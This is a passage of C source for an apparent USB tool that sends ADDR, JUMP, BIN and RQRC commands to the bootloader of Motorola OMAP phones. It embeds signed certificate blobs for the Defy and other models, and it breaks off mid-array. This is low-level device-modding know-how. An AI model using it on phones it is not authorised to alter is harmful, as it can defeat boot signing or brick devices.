#include <stdint.h>
#include <stdio.h>
#include "lusb0_usb.h"

#define VID_MOTOROLA 0x22B8
#define PID_OMAP34XX 0x41D0
#define PID_OMAP36XX 0x4280
#define EP_IN 0x82
#define EP_OUT 0x01
#define BUF_SIZE 64

uint64_t encodenum(uint32_t num)
{
    char ret[9];
    sprintf(ret, "%08x", num);
    return *(uint64_t *) ret;
}

void addr(usb_dev_handle* dev, uint32_t addr)
{
    char out[] = { 2, 'A', 'D', 'D', 'R', 0x1e, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3 };
    *(uint64_t*) &out[6] = encodenum(addr);
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void jump(usb_dev_handle* dev)
{
    char out[] = { 2, 'J', 'U', 'M', 'P', 0x1e, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3};
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void bin(usb_dev_handle* dev, void* buffer, uint16_t len)
{
    char out[] = { 2, 'B', 'I', 'N', 0x1e, 0, 0 };
    *(uint16_t*)&out[5] = _byteswap_ushort(len);

    char allout[0x3000];
    memcpy(allout, out, sizeof(out));
    memcpy(&allout[sizeof(out)], buffer, len);
    allout[sizeof(out) + len] = 0;
    allout[sizeof(out) + len + 1] = 3;

    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, allout, sizeof(out) + len + 2, 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

void rqrc(usb_dev_handle* dev, uint32_t start, uint32_t end)
{
    char out[] = { 2, 'R', 'Q', 'R', 'C', 0x1e, 0, 0, 0, 0, 0, 0, 0, 0, ',',  0, 0, 0, 0, 0, 0, 0, 0, 3 };
    *(uint64_t*)&out[6] = encodenum(start);
    *(uint64_t*)&out[15] = encodenum(end);
    printf("> ");
    for (int i = 0; i < sizeof(out); i++)
        if (isascii(out[i]) && isalnum(out[i]))
            printf("%c ", out[i]);
        else
            printf("0x%02x ", (uint8_t)out[i]);
    printf("\n");

    int ret = usb_bulk_write(dev, EP_OUT, out, sizeof(out), 5000);
    if (ret < 0)
    {
        printf("error writing:\n%s\n", usb_strerror());
    }

    char tmp[BUF_SIZE];
    ret = usb_bulk_read(dev, EP_IN, tmp, sizeof(tmp), 5000);
    if (ret < 0)
    {
        printf("error reading:\n%s\n", usb_strerror());
    }

    printf("< ");
    for (int i = 0; i < ret; i++)
        if (isascii(tmp[i]) && isalnum(tmp[i]))
            printf("%c ", tmp[i]);
        else
            printf("0x%02x ", (uint8_t)tmp[i]);
    printf("\n");
}

uint8_t cdt_signature_defy[] =
{
    0xB4, 0x01, 0x00, 0xCA, 0x02, 0x14, 0xDA, 0x95, 0x1B, 0x6D, 0xDC, 0x97, 0x07, 0xCE, 0x40, 0xEA,
    0x53, 0x0F, 0x90, 0x20, 0x91, 0xB5, 0x20, 0xDD, 0x2F, 0xF3, 0x00, 0x30, 0xFF, 0xFF, 0x00, 0x00,
    0x02, 0x4E, 0x29, 0x96, 0xC8, 0xE8, 0x57, 0x58, 0x1F, 0x75, 0x18, 0xBB, 0xB5, 0x76, 0xE1, 0x8A,
    0x17, 0x57, 0xC8, 0x78, 0xC3, 0x1D, 0x01, 0x02, 0x0C, 0x30, 0x00, 0x11, 0x01, 0x89, 0x07, 0x00,
    0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x03, 0xD3, 0x02, 0x07, 0x6D, 0x23, 0xFF, 0xBC, 0xBE,
    0x5E, 0xC2, 0xC1, 0xE9, 0xCB, 0x5C, 0x8C, 0x4C, 0xC1, 0x49, 0xE3, 0xCE, 0x38, 0x88, 0x88, 0x67,
    0xF7, 0x37, 0xA8, 0x60, 0xBF, 0x43, 0xEC, 0xB6, 0x15, 0x7D, 0xAD, 0xB4, 0x93, 0x03, 0xCE, 0x78,
    0x3B, 0xA5, 0x4B, 0xFC, 0x30, 0xE8, 0xCF, 0x39, 0xB0, 0x5C, 0x9C, 0xAC, 0xA1, 0xD2, 0xCF, 0x59,
    0x77, 0x3B, 0xFF, 0xF8, 0x2C, 0x86, 0x5A, 0xE9, 0x48, 0x43, 0x86, 0x0E, 0x9E, 0xAC, 0xF9, 0x88,
    0x61, 0xB2, 0xB3, 0x14, 0x5F, 0xC2, 0x58, 0x28, 0x86, 0x44, 0xF6, 0x9A, 0xAD, 0xBE, 0xF1, 0x74,
    0xBD, 0xBA, 0xED, 0x1B, 0xE4, 0xBC, 0x19, 0xAF, 0xD9, 0x22, 0xA4, 0xE9, 0x84, 0x66, 0x39, 0x77,
    0xA3, 0x76, 0x81, 0x90, 0xFE, 0x52, 0xCC, 0x96, 0x77, 0xAC, 0xEE, 0xA6, 0x91, 0xB1, 0x5F, 0x1B,
    0x4F, 0xB2, 0x45, 0x80, 0xF1, 0x15, 0xB8, 0x6F, 0x52, 0x92, 0x01, 0x02, 0x01, 0x00, 0x04, 0x2E,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x48, 0x41, 0x42, 0x20, 0x43, 0x41, 0x20, 0x34, 0x37, 0x33, 0x4B, 0xB3,
    0x8B, 0xC1, 0x67, 0xEA, 0xD6, 0x41, 0x01, 0x00, 0x04, 0x39, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F,
    0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74,
    0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53,
    0x46, 0x20, 0x43, 0x41, 0x20, 0x34, 0x37, 0x33, 0x2D, 0x31, 0x3B, 0x20, 0x53, 0x4E, 0x3D, 0x34,
    0x34, 0x39, 0x36, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00, 0x80, 0xBB, 0xA5, 0x81, 0x22,
    0x50, 0x33, 0x87, 0x0C, 0xF6, 0x98, 0x95, 0x25, 0xF2, 0xF9, 0x15, 0x42, 0xD1, 0x55, 0x81, 0xE0,
    0x30, 0x29, 0xCE, 0xDA, 0xFC, 0x04, 0x97, 0xF4, 0x0A, 0x2B, 0x2D, 0x2E, 0xBC, 0x9C, 0xB4, 0x26,
    0xA2, 0x00, 0xDA, 0x9A, 0xE8, 0x9C, 0x32, 0x34, 0x0D, 0xCF, 0xB0, 0xE1, 0xAA, 0xA8, 0x6E, 0x41,
    0x36, 0x17, 0x11, 0x66, 0xBD, 0x71, 0xFE, 0xFD, 0x64, 0xFD, 0x44, 0x27, 0x4E, 0x8F, 0xA9, 0xBD,
    0xA6, 0x1E, 0x95, 0x58, 0xC5, 0x3C, 0x12, 0x35, 0x47, 0xE0, 0x5D, 0x06, 0x21, 0xC8, 0xC9, 0xF6,
    0x84, 0xB2, 0x03, 0x62, 0xF6, 0x25, 0xF6, 0x1C, 0x66, 0x4F, 0x48, 0xE1, 0x32, 0x90, 0xF4, 0x28,
    0x9B, 0x7C, 0xF7, 0x63, 0x8E, 0x1D, 0xDE, 0x8D, 0x1C, 0x0A, 0x1E, 0xE0, 0x1A, 0xAE, 0x2D, 0x22,
    0xCD, 0x84, 0x0E, 0x23, 0x7E, 0xB6, 0xDA, 0x83, 0x89, 0x03, 0x77, 0x3D, 0x00, 0x80, 0x31, 0x35,
    0x19, 0x89, 0xB2, 0xA9, 0x9F, 0xC6, 0xFB, 0x79, 0xC7, 0x7D, 0xA7, 0xCE, 0x25, 0x76, 0x9C, 0xD9,
    0x99, 0x77, 0x76, 0x3D, 0x89, 0x28, 0x71, 0xE6, 0xDA, 0xCC, 0x84, 0x35, 0xCC, 0xB6, 0xCF, 0xBE,
    0x54, 0x86, 0x1F, 0x9B, 0x76, 0x43, 0x3D, 0xEC, 0x9D, 0x63, 0xC0, 0xC9, 0xE1, 0x2C, 0xD4, 0xCF,
    0x46, 0x47, 0x28, 0xFB, 0xDA, 0xDB, 0x0C, 0x6C, 0x46, 0xCC, 0x08, 0x6F, 0xEA, 0x41, 0x96, 0x6A,
    0x38, 0x6D, 0xBD, 0x67, 0x58, 0x24, 0x17, 0xE5, 0xE1, 0xA7, 0x63, 0x7E, 0xDC, 0x8A, 0x85, 0x13,
    0xF8, 0x1F, 0x43, 0x3A, 0xC3, 0x59, 0x0B, 0x3A, 0x6F, 0x7E, 0x81, 0x41, 0x23, 0x21, 0xC4, 0x0E,
    0x62, 0x27, 0x50, 0xB4, 0xEA, 0xF6, 0xEF, 0x70, 0xB5, 0x03, 0xD1, 0x6D, 0x4D, 0xD7, 0x8A, 0x40,
    0x7B, 0x05, 0x09, 0x94, 0x35, 0x00, 0xC0, 0x5F, 0xB5, 0xAF, 0x5D, 0x4D, 0xB4, 0xC0, 0x01, 0x02,
    0x01, 0x00, 0x04, 0x30, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49,
    0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20,
    0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53, 0x46, 0x20, 0x43, 0x41, 0x20, 0x34,
    0x37, 0x33, 0x2D, 0x31, 0x4B, 0xB3, 0x8C, 0x73, 0x67, 0xEA, 0xD6, 0xF3, 0x01, 0x00, 0x04, 0x38,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x41, 0x50, 0x50, 0x20, 0x34, 0x37, 0x33, 0x2D, 0x31, 0x2D, 0x32, 0x3B,
    0x20, 0x53, 0x4E, 0x3D, 0x34, 0x34, 0x39, 0x38, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00,
    0x80, 0x9F, 0x29, 0x51, 0x44, 0x9E, 0x39, 0x88, 0xE3, 0xD4, 0xB3, 0x57, 0x95, 0x22, 0x9F, 0x19,
    0x94, 0x14, 0x94, 0x2D, 0xCE, 0x30, 0xB5, 0x57, 0x24, 0xC5, 0x59, 0x0F, 0xF5, 0x4A, 0xF9, 0x5D,
    0x78, 0xD4, 0x95, 0x0F, 0xAA, 0x94, 0xFA, 0xE3, 0x9D, 0x82, 0xEA, 0x61, 0x28, 0xFF, 0x38, 0x7F,
    0x85, 0x86, 0x9C, 0x14, 0x70, 0x36, 0x11, 0x91, 0x44, 0xD7, 0xCC, 0xD0, 0xE0, 0x00, 0xFA, 0x2B,
    0xE6, 0x79, 0x63, 0xB9, 0xA7, 0xE7, 0xB5, 0x95, 0x3B, 0x86, 0x89, 0xD6, 0xE3, 0x80, 0xE6, 0xF5,
    0x2F, 0x0C, 0x12, 0x22, 0x63, 0x3E, 0x4A, 0xF4, 0x07, 0xCC, 0x53, 0xF4, 0xF7, 0x12, 0x40, 0xAA,
    0x39, 0xFE, 0x20, 0x8D, 0xCA, 0xF0, 0x52, 0x5D, 0x77, 0x85, 0x82, 0x35, 0x4B, 0x5D, 0x9D, 0x2D,
    0x87, 0x24, 0x15, 0xD0, 0xCC, 0xFE, 0x66, 0xA8, 0x13, 0xFD, 0xE0, 0xC7, 0x13, 0x75, 0x24, 0x4E,
    0x43, 0x00, 0x80, 0x46, 0x8C, 0xBA, 0x26, 0x19, 0x32, 0x88, 0x53, 0xB6, 0x49, 0x18, 0x98, 0xE5,
    0xAF, 0x90, 0x1E, 0xFD, 0xF0, 0x46, 0xB5, 0x1C, 0x7F, 0x43, 0xCC, 0x97, 0xAB, 0x47, 0x16, 0x70,
    0x4A, 0xD5, 0x34, 0x5A, 0xCA, 0xAE, 0x7C, 0x14, 0x25, 0xAB, 0x3D, 0x7A, 0x0E, 0xF1, 0x6F, 0x15,
    0x83, 0x0B, 0xB2, 0x9B, 0x45, 0x15, 0xB8, 0x47, 0x87, 0xBC, 0x03, 0x83, 0x3B, 0x59, 0x0F, 0x09,
    0xD1, 0xCA, 0x72, 0xB0, 0xD6, 0xC0, 0x6E, 0x28, 0x7D, 0x86, 0x68, 0xCC, 0x29, 0x70, 0x77, 0xE5,
    0x72, 0x72, 0x74, 0xAD, 0x6C, 0xA1, 0xC4, 0x07, 0x9D, 0xCA, 0x9F, 0x5D, 0x8A, 0x64, 0x0F, 0x2D,
    0xA7, 0xD7, 0x8F, 0x20, 0xFE, 0x00, 0x06, 0xAE, 0x6D, 0x50, 0xC4, 0x86, 0x87, 0x30, 0x4A, 0xD8,
    0x96, 0x70, 0x32, 0x85, 0xC3, 0x2C, 0x22, 0x4E, 0x3D, 0x8B, 0x24, 0x01, 0x98, 0x90, 0x18, 0x20,
    0xE5, 0xE8, 0x8C, 0x25, 0x9D, 0xEF, 0x01, 0xC7, 0x26, 0x47, 0xBA, 0x0E, 0x43, 0x32, 0x04, 0xFD,
    0x2B, 0x77, 0x9C, 0x2B, 0xE3, 0x59, 0xB2, 0xCF, 0x8A, 0x6F, 0xC7, 0x08, 0x42, 0x99, 0x8C, 0x79,
    0xD2, 0x09, 0xC4, 0x0B, 0xEC, 0x7B, 0x71, 0x74, 0xA4, 0x75, 0x14, 0x4C, 0x95, 0x64, 0xD8, 0x9A,
    0x36, 0x59, 0x3F, 0xEB, 0x4E, 0x4D, 0xEE, 0x21, 0x2C, 0x59, 0xB6, 0x28, 0xFD, 0xAF, 0x28, 0x6E,
    0x38, 0xEA, 0xC4, 0x20, 0xFF, 0x49, 0x0B, 0x42, 0xBE, 0x7F, 0x07, 0x3A, 0x0B, 0x10, 0x76, 0xD5,
    0x48, 0x1D, 0xA4, 0x79, 0x85, 0xF7, 0xE1, 0x9F, 0xC5, 0x48, 0x46, 0x1D, 0x53, 0x66, 0xAB, 0x51,
    0xD9, 0x18, 0x93, 0x69, 0x73, 0x45, 0xC4, 0x78, 0x53, 0x99, 0xFD, 0xB8, 0xFB, 0x37, 0x01, 0x87,
    0x61, 0xDB, 0x1E, 0x84, 0xD5, 0x43, 0x90, 0xD5, 0x16, 0xF5, 0x71, 0x49, 0x38, 0x84, 0x92, 0x02,
    0x1B, 0x43, 0xB2
};

uint8_t cdt_signature_ms[] =
{
    0xB4, 0x01, 0x00, 0xCA, 0x02, 0x14, 0xDA, 0x95, 0x1B, 0x6D, 0xDC, 0x97, 0x07, 0xCE, 0x40, 0xEA,
    0x53, 0x0F, 0x90, 0x20, 0x91, 0xB5, 0x20, 0xDD, 0x2F, 0xF3, 0x00, 0x30, 0xFF, 0xFF, 0x00, 0x00,
    0x02, 0x4E, 0xB8, 0xB9, 0x73, 0x15, 0xB0, 0xF4, 0x4A, 0x47, 0x7A, 0xAC, 0xDF, 0x7A, 0xE8, 0x3D,
    0xD5, 0x3E, 0xEF, 0x8F, 0xAF, 0x65, 0x01, 0x02, 0x0C, 0x30, 0x00, 0x11, 0x01, 0x8F, 0x07, 0x00,
    0x00, 0x00, 0x00, 0x38, 0x00, 0x00, 0x00, 0x03, 0xD3, 0x02, 0x9E, 0xD4, 0x3D, 0x5F, 0x7F, 0xD5,
    0x15, 0x59, 0x64, 0xA3, 0xE2, 0xA1, 0x21, 0x7D, 0x46, 0x79, 0x86, 0xC4, 0xA2, 0x22, 0xAB, 0xFA,
    0xED, 0xB2, 0x7B, 0xF2, 0xCF, 0xE8, 0x32, 0xE2, 0x7D, 0xFF, 0x6F, 0x5F, 0x18, 0xDF, 0xAD, 0x27,
    0x85, 0x44, 0xF4, 0xB7, 0x73, 0x85, 0xA6, 0x14, 0x63, 0x12, 0x7B, 0xC4, 0xEE, 0x1D, 0x20, 0xAC,
    0xCB, 0x2A, 0xC1, 0x7F, 0x26, 0x48, 0x59, 0x2C, 0x2C, 0xFD, 0xB9, 0xCB, 0xA9, 0xC6, 0x18, 0x6F,
    0x4F, 0xE6, 0x94, 0x8E, 0xF2, 0x66, 0x0D, 0x37, 0xA5, 0x62, 0x69, 0x6F, 0xBB, 0x13, 0x27, 0xB1,
    0x3D, 0x5B, 0x9C, 0x8A, 0x79, 0x93, 0xBA, 0x9D, 0x4E, 0x7E, 0x0C, 0xED, 0x7B, 0x53, 0x9A, 0x62,
    0x94, 0xFD, 0xDC, 0x36, 0xE7, 0x84, 0x17, 0xA9, 0x37, 0x7C, 0x64, 0x13, 0xAF, 0xAE, 0xD0, 0xB0,
    0xAA, 0x34, 0x2A, 0x4D, 0x38, 0x83, 0xD1, 0x82, 0x3A, 0x29, 0x01, 0x02, 0x01, 0x00, 0x04, 0x2E,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x48, 0x41, 0x42, 0x20, 0x43, 0x41, 0x20, 0x34, 0x30, 0x31, 0x48, 0xF4,
    0xC1, 0x97, 0x65, 0x2A, 0xBA, 0x97, 0x01, 0x00, 0x04, 0x39, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F,
    0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74,
    0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53,
    0x46, 0x20, 0x43, 0x41, 0x20, 0x34, 0x30, 0x31, 0x2D, 0x31, 0x3B, 0x20, 0x53, 0x4E, 0x3D, 0x33,
    0x38, 0x33, 0x32, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00, 0x80, 0xB3, 0xF1, 0x99, 0x8E,
    0x56, 0x03, 0x0B, 0x85, 0x7E, 0xEE, 0xD6, 0x97, 0xB3, 0x4C, 0x5C, 0xAD, 0xEB, 0x2C, 0x9A, 0x8F,
    0xFF, 0x57, 0x4B, 0xC3, 0x0F, 0x82, 0xA4, 0xD1, 0xB2, 0xE6, 0x2D, 0xA9, 0xBF, 0x59, 0x17, 0xD1,
    0xD1, 0x4C, 0x3D, 0x7D, 0xF2, 0xF1, 0x85, 0x94, 0x1B, 0x4A, 0xDE, 0xA6, 0x1B, 0x03, 0x12, 0x42,
    0xDA, 0x56, 0xAB, 0xF9, 0x44, 0xA1, 0x91, 0xDB, 0x77, 0xD3, 0x79, 0xCD, 0xFB, 0x5B, 0xCE, 0x59,
    0x38, 0xCC, 0x15, 0xB4, 0x79, 0x97, 0xE1, 0x74, 0x88, 0x4B, 0x3D, 0xF0, 0x71, 0x8A, 0xD0, 0x94,
    0xAD, 0x95, 0xF5, 0xA5, 0xD9, 0xB1, 0x69, 0x18, 0xDE, 0x78, 0x2D, 0xFC, 0xC2, 0xF0, 0x77, 0x15,
    0x20, 0x9A, 0x78, 0x0A, 0xE4, 0xD3, 0xBE, 0x30, 0xEF, 0x21, 0xD3, 0x78, 0xAF, 0x72, 0xB6, 0xBF,
    0x23, 0xC4, 0x50, 0x67, 0x4A, 0x4B, 0x74, 0x9F, 0xE7, 0x9B, 0xF0, 0x0D, 0x00, 0x80, 0xA8, 0x6E,
    0x83, 0x73, 0xCB, 0xB1, 0xA3, 0x81, 0x88, 0x29, 0x0C, 0x31, 0xF8, 0x7D, 0xD2, 0xD6, 0xB1, 0xC6,
    0x9D, 0x83, 0x7B, 0xCC, 0x57, 0x83, 0x81, 0x2A, 0x47, 0x04, 0x1B, 0x47, 0xB8, 0xA9, 0x20, 0x58,
    0x88, 0x11, 0xEC, 0x86, 0xA1, 0xA6, 0xC1, 0xAD, 0xAA, 0x1E, 0xEE, 0xA1, 0xEB, 0x33, 0xDB, 0xC8,
    0x58, 0x30, 0x65, 0xED, 0x9D, 0xEE, 0x5C, 0xE1, 0x62, 0x89, 0x96, 0x84, 0xC7, 0x9B, 0x62, 0xC1,
    0x83, 0x58, 0xB1, 0xD7, 0xC7, 0x35, 0xE2, 0xE4, 0x6A, 0xF9, 0x50, 0xEA, 0x85, 0x7D, 0xBB, 0xAE,
    0xF3, 0xC0, 0xFC, 0x65, 0x4E, 0xD6, 0x87, 0xD1, 0xB1, 0x2B, 0x56, 0x19, 0x57, 0x69, 0x87, 0x84,
    0xAB, 0x4E, 0x21, 0x87, 0xD1, 0x49, 0x17, 0xF2, 0xF3, 0x98, 0xC1, 0xAF, 0x64, 0x0C, 0x82, 0x5F,
    0x24, 0x9B, 0xB5, 0xA0, 0xA7, 0xAA, 0x82, 0x24, 0x52, 0x4A, 0x8B, 0x21, 0x2F, 0xB0, 0x01, 0x02,
    0x01, 0x00, 0x04, 0x30, 0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49,
    0x6E, 0x63, 0x2C, 0x20, 0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20,
    0x50, 0x4B, 0x49, 0x2C, 0x20, 0x43, 0x4E, 0x3D, 0x43, 0x53, 0x46, 0x20, 0x43, 0x41, 0x20, 0x34,
    0x30, 0x31, 0x2D, 0x31, 0x48, 0xF4, 0xC2, 0x32, 0x65, 0x2A, 0xBB, 0x32, 0x01, 0x00, 0x04, 0x38,
    0x4F, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x49, 0x6E, 0x63, 0x2C, 0x20,
    0x4F, 0x55, 0x3D, 0x4D, 0x6F, 0x74, 0x6F, 0x72, 0x6F, 0x6C, 0x61, 0x20, 0x50, 0x4B, 0x49, 0x2C,
    0x20, 0x43, 0x4E, 0x3D, 0x41, 0x50, 0x50, 0x20, 0x34, 0x30, 0x31, 0x2D, 0x31, 0x2D, 0x32, 0x3B,
    0x20, 0x53, 0x4E, 0x3D, 0x33, 0x38, 0x33, 0x34, 0x02, 0x00, 0x00, 0x03, 0x01, 0x00, 0x01, 0x00,
    0x80, 0xB9, 0x8E, 0x7F, 0x4E, 0xE7, 0xC2, 0xFA, 0x97, 0x1E, 0x48, 0x07, 0xB6, 0x19, 0x13, 0x3C,
    0x28, 0x59, 0xEC, 0xD2, 0x4F, 0xED, 0xE6, 0x9C, 0xC6, 0xC0, 0x96, 0xE7, 0x70, 0x1C, 0x77, 0xF0,
    0x7C, 0x24, 0xFA, 0xC4, 0xC3, 0x9B, 0x40, 0xC1, 0x59, 0xCF, 0x8C, 0x8F, 0x99, 0x81, 0xC2, 0xFF,
    0xD0, 0x0C, 0x86, 0x23, 0x59, 0xBC, 0x43, 0x59, 0x2F, 0xA9, 0xB8, 0x59, 0x19, 0x67, 0xEE, 0x0E,
    0xC5, 0xC9, 0xEE, 0x40, 0x1F, 0x69, 0x24, 0x96, 0x10, 0xEE, 0xB7, 0xDC, 0xA9, 0x66, 0x44, 0xAB,
    0xB8, 0xE1, 0x6A, 0xAB, 0xEA, 0xC6, 0x4F, 0xCF, 0x0A, 0x51, 0x40, 0x52, 0x9F, 0x0B, 0x22, 0x0E,
    0x3C, 0x68, 0x09, 0x7E, 0x28, 0xB6, 0xBC, 0xC9, 0x6C, 0x3F, 0x77, 0x8A, 0x8D, 0xA5, 0x58, 0x2C,
    0xF6, 0xAE, 0x7C, 0xFE, 0xC6, 0x26, 0x12, 0xE1, 0xAF, 0xCE, 0x46, 0x2C, 0xF0, 0xA1, 0x39, 0x6A,
    0x7F, 0x00, 0x80, 0x4E, 0x8C, 0x40, 0x1F, 0xFA, 0xB8, 0x88, 0x86, 0x0B, 0x1D, 0xF2, 0xA9, 0x5E,
    0x93, 0xF8, 0xD4, 0x74, 0xEE, 0x7A, 0x08, 0x3C, 0x72, 0x35, 0xA6, 0x63, 0x38, 0xC6, 0x85, 0x8B,
    0xAF, 0x03, 0xCF, 0x6F, 0x19, 0xDD, 0x1A, 0xA1, 0xE8, 0xC9, 0xA9, 0x57, 0x01, 0xC2, 0x22, 0x51,
    0xB0, 0x6C, 0x6C, 0xEE, 0x67, 0x3F, 0x4A, 0xB7, 0x5E, 0xBD, 0x6A, 0x45, 0x59, 0x62, 0x86, 0x52,
    0xB3, 0xDF, 0x65, 0x65, 0x2A, 0x3A, 0x05, 0xB7, 0xBF, 0x82, 0xEB, 0x83, 0x2A, 0x37, 0x27, 0xF1,
    0x76, 0x2C, 0x05, 0xB8, 0x6D, 0x91, 0xCC, 0x2F, 0xC7, 0x7E, 0xFD, 0x56, 0xE2, 0x0F, 0x9B, 0xDB,
    0x2A, 0x1E, 0x9F, 0xCE, 0x96, 0x8C, 0xF9, 0x8B, 0xE7, 0x97, 0xB0, 0xD9, 0x68, 0xBC, 0xC4, 0x3E,
    0xA7, 0xBD, 0x2F, 0x72, 0x76, 0x9E, 0xB1, 0x48, 0x6A, 0x4F, 0x0B, 0xA4, 0x3F, 0xC0, 0x7A, 0x78,
    0xC6, 0x68, 0x4D, 0xA7, 0xB6, 0x44, 0x53, 0x91, 0x12, 0xAE, 0xEA, 0x1E, 0x06, 0x55, 0x26, 0x27,
    0x48, 0x67, 0x05, 0xF0, 0xCF, 0x8E, 0xB6, 0xD3, 0xF0, 0x98, 0x8E, 0xE8, 0x19, 0xC1, 0x2B, 0xE2,
    0x24, 0xF4, 0x3A, 0x06, 0xE9, 0xFE, 0xC1, 0x8B, 0x3E, 0xB3, 0x7D, 0x6A, 0xB6, 0xAE, 0xC7, 0x94,
    0xC6, 0xF2, 0xEA, 0x29, 0x1C, 0x81, 0xF2, 0xFE, 0xF1, 0x32, 0x68, 0x36, 0x2C, 0x55, 0x56, 0x48,
    0xB7, 0xB0, 0xE0, 0xC6, 0x74, 0xDD, 0x0B, 0x45, 0xA6, 0x70, 0x5C, 0x17, 0x33, 0xE5, 0xF7, 0x73,
    0x92, 0xB3, 0x41, 0x32, 0x07, 0x35, 0x0C, 0xD7, 0x56, 0x57, 0xDF, 0x15, 0xD9, 0xC6, 0xF0, 0x92,
    0x20, 0xBB, 0x77, 0x77, 0x52, 0xA5, 0x8F, 0x45, 0x04, 0x50, 0x59, 0x5E, 0x04, 0x99, 0x6B, 0x9B,
    0x91, 0x6A, 0x7E, 0xE7, 0xC2, 0xD4, 0x0A, 0x28, 0xED, 0x82, 0x89, 0x4E, 0x1E, 0x2C, 0xF3, 0x60,
    0xF3, 0xB9, 0x42
};

uint8_t cdt_signature_ms2[] =
{
    0xB4, 0x01, 0x00, 0xCA, 0x02, 0x14, 0xDA, 0x95, 0x1B, 0x6D, 0xDC, 0x97, 0x07, 0xCE, 0x40, 0xEA,
    0x53, 0x0F, 0x90, 0x20, 0x91, 0xB5, 0x20, 0xDD, 0x2F, 0xF3, 0x00, 0x30, 0xFF, 0xFF, 0x00, 0x00,
